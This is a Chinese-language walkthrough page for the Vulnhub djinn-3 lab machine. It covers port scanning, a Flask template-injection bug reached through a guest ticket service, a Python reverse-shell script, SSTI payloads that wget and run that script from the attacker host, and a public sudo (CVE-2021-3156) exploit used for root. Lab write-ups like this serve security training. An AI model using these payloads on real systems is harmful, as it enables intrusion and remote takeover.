@@ -1,0 +1,164 @@
+<!doctype html><html><head><title>Vulnhub 492 djinn-3</title><meta charset=utf-8><meta name=X-UA-Compatible content="IE=edge"><meta name=google-site-verification content><meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" name=viewport><meta content="telephone=no" name=format-detection><meta name=description content><meta name=renderer content="webkit"><meta name=theme-color content="#ffffff"><script type=text/javascript>(function(e,t,n,s,o,i,a){e[n]=e[n]||function(){(e[n].q=e[n].q||[]).push(arguments)},i=t.createElement(s),i.async=1,i.src="https://www.clarity.ms/tag/"+o,a=t.getElementsByTagName(s)[0],a.parentNode.insertBefore(i,a)})(window,document,"clarity","script","abcdefghzd")</script><script src=/js/toc.js></script>
+<link type=text/css rel=stylesheet href=/vendor/css/bootstrap.min.css><link rel=stylesheet href=/scss/dark-mode.scss integrity media=screen><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Material+Icons"><script>console.log("Hello from 'layouts/partials/extended_head.html'")</script></head><body><div id=app><div class=single-column-drawer-container id=drawer v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }"><div class=drawer-content><div class=drawer-menu><a class="a-block drawer-menu-item active" href=/walkthrough>Walkthroughs</a>
+<a class="a-block drawer-menu-item false" href=/posts>Archive</a>
+<a class="a-block drawer-menu-item false" href=/categories>Categories</a>
+<a class="a-block drawer-menu-item false" href=/tags>Tags</a>
+<a class="a-block drawer-menu-item false" href=/index.xml>RSS Feed</a><div class=toc><div class=toc-content><center>- 目录 -</center><ul><ul><li><a href=#%e7%8e%af%e5%a2%83%e9%85%8d%e7%bd%ae class=nav-环境配置>环境配置</a></li><li><a href=#%e5%88%9d%e6%ad%a5%e6%89%93%e7%82%b9 class=nav-初步打点>初步打点</a></li><ul><li><a href=#%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f class=nav-端口扫描>端口扫描</a></li><li><a href=#web%e6%b5%8b%e8%af%95 class=nav-web测试>WEB测试</a></li><li><a href=#%e6%bc%8f%e6%b4%9e%e5%8f%91%e7%8e%b0 class=nav-漏洞发现>漏洞发现</a></li></ul><li><a href=#%e8%8e%b7%e5%be%97%e6%9d%83%e9%99%90 class=nav-获得权限>获得权限</a></li><ul><li><a href=#%e9%9d%b6%e6%9c%ba%e6%b5%8b%e8%af%95 class=nav-靶机测试>靶机测试</a></li></ul><li><a href=#%e6%8f%90%e6%9d%83 class=nav-提权>提权</a></li></ul></div></div></div></div></div><transition name=fade><div id=drawer-mask v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if=isDrawerOpen v-on:click=toggleDrawer></div></transition><nav id=navBar class="navbar sticky-top navbar-light single-column-nav-container"><div id=navBackground class=nav-background></div><div class="container container-narrow nav-content"><button id=nav_dropdown_btn class=nav-dropdown-toggle type=button v-on:click=toggleDrawer>
+<i class=material-icons>menu</i></button>
+<a id=navTitle class=navbar-brand href=https://www.vulnhub.cn>Vulnhub靶机教程</a>
+<button type=button class=nav-darkmode-toggle id=darkModeToggleButton2>
+<i class=material-icons id=darkModeToggleIcon2>dark_mode</i></button></div></nav><div class=single-column-header-container id=pageHead v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }"><a href=https://www.vulnhub.cn><div class=single-column-header-title>Vulnhub靶机教程</div><div class=single-column-header-subtitle>Themed by Diary.</div></a></div><div id=content><div id=streamContainer class=stream-container><div class="post-list-container post-list-container-shadow"><div class=post><div class=post-head-wrapper-text-only><div class=post-title>Vulnhub 492 djinn-3<div class=post-meta><time itemprop=datePublished>2020-06-19 00:00</time></div></div></div><div class=post-body-wrapper><div class=post-body v-pre><p>考点：flask</p><p>靶机链接：<a href=https://www.vulnhub.com/entry/djinn-3,492/>https://www.vulnhub.com/entry/djinn-3,492/</a></p><h2 id=环境配置>环境配置</h2><table><thead><tr><th>名称</th><th>IP</th></tr></thead><tbody><tr><td>Kali Linux</td><td>10.0.2.15</td></tr><tr><td>djinn-3</td><td>10.0.2.10</td></tr></tbody></table><h2 id=初步打点>初步打点</h2><h3 id=端口扫描>端口扫描</h3><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ <span style=color:#658b00>export</span> <span style=color:#00688b>rip</span>=10.0.2.10
+</span></span><span style=display:flex><span>$ sudo nmap -v -A -p- <span style=color:#00688b>$rip</span>
+</span></span><span style=display:flex><span>PORT      STATE SERVICE VERSION
+</span></span><span style=display:flex><span>22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>2048</span> e6:44:23:ac:b2:d9:82:e7:90:58:15:5e:40:23:ed:65 (RSA)
+</span></span><span style=display:flex><span>|   <span style=color:#b452cd>256</span> ae:04:85:6e:cb:10:4f:55:4a:ad:96:9e:f2:ce:18:4f (ECDSA)
+</span></span><span style=display:flex><span>|_  <span style=color:#b452cd>256</span> f7:08:56:19:97:b5:03:10:18:66:7e:7d:2e:0a:47:42 (ED25519)
+</span></span><span style=display:flex><span>80/tcp    open  http    lighttpd 1.4.45
+</span></span><span style=display:flex><span>|_http-title: Custom-ers
+</span></span><span style=display:flex><span>| http-methods: 
+</span></span><span style=display:flex><span>|_  Supported Methods: OPTIONS GET HEAD POST
+</span></span><span style=display:flex><span>|_http-server-header: lighttpd/1.4.45
+</span></span><span style=display:flex><span>5000/tcp  open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
+</span></span><span style=display:flex><span>| http-methods: 
+</span></span><span style=display:flex><span>|_  Supported Methods: OPTIONS GET HEAD
+</span></span><span style=display:flex><span>|_http-title: Site doesn<span style=color:#cd5555>&#39;t have a title (text/html; charset=utf-8).
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>31337/tcp open  Elite?
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>| fingerprint-strings: 
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL: 
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|     username&gt;
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|   GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|     username&gt; password&gt; authentication failed
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|   Help: 
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|     username&gt; password&gt;
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|   RPCCheck: 
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|     username&gt; Traceback (most recent call last):
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|     File &#34;/opt/.tick-serv/tickets.py&#34;, line 105, in &lt;module&gt;
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|     main()
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|     File &#34;/opt/.tick-serv/tickets.py&#34;, line 93, in main
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|     username = input(&#34;username&gt; &#34;)
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|     File &#34;/usr/lib/python3.6/codecs.py&#34;, line 321, in decode
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|     (result, consumed) = self._buffer_decode(data, self.errors, final)
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|     UnicodeDecodeError: &#39;</span>utf-8<span style=color:#cd5555>&#39; codec can&#39;</span>t decode byte 0x80 in position 0: invalid start byte
+</span></span><span style=display:flex><span>|   SSLSessionReq: 
+</span></span><span style=display:flex><span>|     username&gt; Traceback (most recent call last):
+</span></span><span style=display:flex><span>|     File <span style=color:#cd5555>&#34;/opt/.tick-serv/tickets.py&#34;</span>, line 105, in &lt;module&gt;
+</span></span><span style=display:flex><span>|     main()
+</span></span><span style=display:flex><span>|     File <span style=color:#cd5555>&#34;/opt/.tick-serv/tickets.py&#34;</span>, line 93, in main
+</span></span><span style=display:flex><span>|     <span style=color:#00688b>username</span> = input(<span style=color:#cd5555>&#34;username&gt; &#34;</span>)
+</span></span><span style=display:flex><span>|     File <span style=color:#cd5555>&#34;/usr/lib/python3.6/codecs.py&#34;</span>, line 321, in decode
+</span></span><span style=display:flex><span>|     (result, consumed) = self._buffer_decode(data, self.errors, final)
+</span></span><span style=display:flex><span>|     UnicodeDecodeError: <span style=color:#cd5555>&#39;utf-8&#39;</span> codec can<span style=color:#cd5555>&#39;t decode byte 0xd7 in position 13: invalid continuation byte
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|   TerminalServerCookie: 
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|     username&gt; Traceback (most recent call last):
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|     File &#34;/opt/.tick-serv/tickets.py&#34;, line 105, in &lt;module&gt;
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|     main()
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|     File &#34;/opt/.tick-serv/tickets.py&#34;, line 93, in main
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|     username = input(&#34;username&gt; &#34;)
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|     File &#34;/usr/lib/python3.6/codecs.py&#34;, line 321, in decode
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|     (result, consumed) = self._buffer_decode(data, self.errors, final)
+</span></span></span><span style=display:flex><span><span style=color:#cd5555>|_    UnicodeDecodeError: &#39;</span>utf-8<span style=color:#cd5555>&#39; codec can&#39;</span>t decode byte 0xe0 in position 5: invalid continuation byte
+</span></span></code></pre></td></tr></table></div></div><h3 id=web测试>WEB测试</h3><p>查看5000端口，感觉应该是存在flask SSTI漏洞</p><p>31337端口需要用户名密码，guest/guest 连上，发现可以发内容，并显示在5000端口</p><h3 id=漏洞发现>漏洞发现</h3><p><img src=https://www.vulnhub.cn/walkthrough/492/1.webp alt=1></p><p><img src=https://www.vulnhub.cn/walkthrough/492/2.webp alt=2></p><p>还可以执行命令了</p><p>本地http服务目录存放反弹shell脚本<code>r.py</code></p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">9
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>sys</span>, <span style=color:#008b45;text-decoration:underline>socket</span>, <span style=color:#008b45;text-decoration:underline>subprocess</span>, <span style=color:#008b45;text-decoration:underline>os</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>port = <span style=color:#658b00>int</span>(sys.argv[<span style=color:#b452cd>1</span>])
+</span></span><span style=display:flex><span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span style=display:flex><span>s.connect((<span style=color:#cd5555>&#39;10.0.2.15&#39;</span>, port))
+</span></span><span style=display:flex><span>os.dup2(s.fileno(), <span style=color:#b452cd>0</span>)
+</span></span><span style=display:flex><span>os.dup2(s.fileno(), <span style=color:#b452cd>1</span>)
+</span></span><span style=display:flex><span>os.dup2(s.fileno(), <span style=color:#b452cd>2</span>)
+</span></span><span style=display:flex><span>p = subprocess.call([<span style=color:#cd5555>&#34;/bin/sh&#34;</span>, <span style=color:#cd5555>&#34;-i&#34;</span>])
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#228b22># 下载</span>
+</span></span><span style=display:flex><span>&gt; open                                                      
+</span></span><span style=display:flex><span>Title: <span style=color:#b452cd>8</span>
+</span></span><span style=display:flex><span>Description: {{request.application.__globals__.__builtins__.__import__(<span style=color:#cd5555>&#39;os&#39;</span>).popen(<span style=color:#cd5555>&#39;wget http://10.0.2.15/reverse/r.py -O r.py&#39;</span>).read()}}
+</span></span><span style=display:flex><span><span style=color:#228b22># 运行</span>
+</span></span><span style=display:flex><span>&gt; open                                                      
+</span></span><span style=display:flex><span>Title: <span style=color:#b452cd>9</span>
+</span></span><span style=display:flex><span>Description: {{request.application.__globals__.__builtins__.__import__(<span style=color:#cd5555>&#39;os&#39;</span>).popen(<span style=color:#cd5555>&#39;python3.6 r.py 444&#39;</span>).read()}}
+</span></span></code></pre></td></tr></table></div></div><h2 id=获得权限>获得权限</h2><h3 id=靶机测试>靶机测试</h3><p>本地监听，点击5000端口的链接，获得反弹shells</p><p><img src=https://www.vulnhub.cn/walkthrough/492/3.webp alt=3></p><h2 id=提权>提权</h2><p>使用CVE-2021-3156提权</p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ git clone https://github.com/worawit/CVE-2021-3156
+</span></span><span style=display:flex><span>$ <span style=color:#658b00>cd</span> CVE-2021-3156
+</span></span><span style=display:flex><span>$ python exploit_nss.py 
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://www.vulnhub.cn/walkthrough/492/4.webp alt=4></p><hr width=100% id=EOF><p style=color:#777>最后修改于 2020-06-19</p></div></div><nav class=post-pagination><a class=newer-posts href=/walkthrough/499/>下回<br>Vulnhub 499 SUNSET-SOLSTICE</a>
+<a class=older-posts href=/walkthrough/489/>上回<br>Vulnhub 489 HA-NATRAJ</a></nav><div class=post-comment-wrapper></div></div></div></div></div><div id=sideContainer class=side-container><a class="a-block nav-head false" href=https://www.vulnhub.cn><div class=nav-title>Vulnhub靶机教程</div><div class=nav-subtitle>Themed by Diary.</div></a><div class=nav-link-list><a class="a-block nav-link-item active" href=/walkthrough>Walkthroughs</a>
+<a class="a-block nav-link-item false" href=/posts>Archive</a>
+<a class="a-block nav-link-item false" href=/categories>Categories</a>
+<a class="a-block nav-link-item false" href=/tags>Tags</a>
+<a class="a-block nav-link-item false" href=/index.xml>RSS Feed</a></div><div class=nav-footer>Hugo Theme <a href=https://github.com/amazingrise/hugo-theme-diary>Diary</a> by <a href=https://risehere.net/>Rise</a><br>移植自 <a href=https://mak1t0.cc/ target=_blank rel="noreferrer noopener">Makito</a>'s <a href=https://github.com/SumiMakito/hexo-theme-journal/ target=_blank rel="noreferrer noopener">Journal.</a><br><br>&copy;
+This is a customized copyright.</div></div><div id=extraContainer class=extra-container><div class=toc-wrapper><div class=toc><div class=toc-content><center>- 目录 -</center><ul><ul><li><a href=#%e7%8e%af%e5%a2%83%e9%85%8d%e7%bd%ae class=nav-环境配置>环境配置</a></li><li><a href=#%e5%88%9d%e6%ad%a5%e6%89%93%e7%82%b9 class=nav-初步打点>初步打点</a></li><ul><li><a href=#%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f class=nav-端口扫描>端口扫描</a></li><li><a href=#web%e6%b5%8b%e8%af%95 class=nav-web测试>WEB测试</a></li><li><a href=#%e6%bc%8f%e6%b4%9e%e5%8f%91%e7%8e%b0 class=nav-漏洞发现>漏洞发现</a></li></ul><li><a href=#%e8%8e%b7%e5%be%97%e6%9d%83%e9%99%90 class=nav-获得权限>获得权限</a></li><ul><li><a href=#%e9%9d%b6%e6%9c%ba%e6%b5%8b%e8%af%95 class=nav-靶机测试>靶机测试</a></li></ul><li><a href=#%e6%8f%90%e6%9d%83 class=nav-提权>提权</a></li></ul></div></div></div><div class=pagination><a id=globalBackToTop class="pagination-action animated-visibility" href=#top :class="{ invisible: scrollY == 0 }"><i class="material-icons pagination-action-icon">keyboard_arrow_up</i></a>
+<a type=button class=pagination-action id=darkModeToggleButton><span class="material-icons pagination-action-icon" id=darkModeToggleIcon>dark_mode</span></a></div></div><div id=single-column-footer>Hugo Theme <a href=https://github.com/amazingrise/hugo-theme-diary>Diary</a> by <a href=https://risehere.net/>Rise</a><br>移植自 <a href=https://mak1t0.cc/ target=_blank rel="noreferrer noopener">Makito</a>'s <a href=https://github.com/SumiMakito/hexo-theme-journal/ target=_blank rel="noreferrer noopener">Journal.</a><br><br>&copy;
+This is a customized copyright.</div></div><script src=/js/journal.js></script></body></html>
